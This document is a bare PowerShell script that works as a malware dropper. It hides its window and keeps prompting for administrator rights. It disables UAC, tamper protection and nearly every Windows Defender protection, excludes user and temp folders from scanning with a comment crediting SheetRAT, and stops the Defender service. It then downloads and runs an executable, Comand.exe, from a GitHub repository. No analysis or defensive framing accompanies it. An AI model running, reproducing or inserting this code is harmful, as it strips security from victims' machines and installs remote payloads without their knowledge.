# ===== HIDE WINDOW =====
try {
    Add-Type -Name W -Namespace C -MemberDefinition '[DllImport("Kernel32.dll")] public static extern IntPtr GetConsoleWindow();[DllImport("User32.dll")] public static extern bool ShowWindow(IntPtr h,int c);' -ErrorAction SilentlyContinue
    $w = [C.W]::GetConsoleWindow()
    if ($w -ne [IntPtr]::Zero) { [C.W]::ShowWindow($w, 0) | Out-Null }
} catch {}

# ===== ADMIN CHECK + ELEVATION =====
$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

if (-not $isAdmin) {
    $tmp = Join-Path $env:TEMP "_svc.ps1"
    (iwr "https://github.com/analysisw/test/raw/refs/heads/main/test.ps1" -UseBasicParsing).Content | Out-File $tmp -Encoding UTF8 -Force
    while ($true) {
        $p = Start-Process powershell -Verb RunAs -PassThru -WindowStyle Hidden -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$tmp`""
        if ($p -ne $null) { [Environment]::Exit(0) }
        Start-Sleep -Seconds 2
    }
}

$uacPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
$uacProperty = "EnableLUA"
Set-ItemProperty -Path $uacPath -Name $uacProperty -Value 0

#Requires -RunAsAdministrator

#Requires -RunAsAdministrator

# ===== 1. TAMPER PROTECTION OFF =====
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Features" -Name "TamperProtection" -Value 0 -Type DWord -Force

# ===== 2. START SERVICE BEFORE Set-MpPreference =====
$svc = Get-Service -Name WinDefend -ErrorAction SilentlyContinue
if ($svc -and $svc.Status -ne "Running") {
    Start-Service -Name WinDefend -Force -ErrorAction SilentlyContinue
    Start-Sleep -Seconds 3
}

# ===== 3. REGISTRY POLICIES (work without service) =====
New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Force | Out-Null
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1 -Type DWord -Force

New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Force | Out-Null
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableBehaviorMonitoring" -Value 1 -Type DWord -Force
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableOnAccessProtection" -Value 1 -Type DWord -Force
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableScanOnRealtimeEnable" -Value 1 -Type DWord -Force

# ===== 4. Set-MpPreference (service alive) =====
try { Set-MpPreference -DisableRealtimeMonitoring $true } catch {}
try { Set-MpPreference -DisableBehaviorMonitoring $true } catch {}
try { Set-MpPreference -DisableBlockAtFirstSeen $true } catch {}
try { Set-MpPreference -DisableIOAVProtection $true } catch {}
try { Set-MpPreference -DisablePrivacyMode $true } catch {}
try { Set-MpPreference -DisableArchiveScanning $true } catch {}
try { Set-MpPreference -DisableIntrusionPreventionSystem $true } catch {}
try { Set-MpPreference -DisableScriptScanning $true } catch {}
try { Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true } catch {}
try { Set-MpPreference -SubmitSamplesConsent 2 } catch {}
try { Set-MpPreference -MAPSReporting 0 } catch {}
try { Set-MpPreference -HighThreatDefaultAction 6 -Force } catch {}
try { Set-MpPreference -ModerateThreatDefaultAction 6 } catch {}
try { Set-MpPreference -LowThreatDefaultAction 6 } catch {}
try { Set-MpPreference -SevereThreatDefaultAction 6 } catch {}

# ===== 5. WMI EXCLUSION PATHS (like SheetRAT) =====
try {
    $wmi = Get-WmiObject -Namespace "root\Microsoft\Windows\Defender" -Class MSFT_MpPreference
    $paths = @()
    if ($env:TEMP) { $paths += $env:TEMP }
    if ($env:APPDATA) { $paths += $env:APPDATA }
    $paths += "C:\Users"
    $wmi.Add("ExclusionPath", $paths)
} catch {}

# ===== 6. STOP SERVICE AFTER =====
sc.exe stop WinDefend
sc.exe config WinDefend start= disabled


$p="$env:TEMP\Comand.exe"; Invoke-WebRequest "https://github.com/analysisw/test/raw/refs/heads/main/Comand.exe" -OutFile $p; Start-Process $p
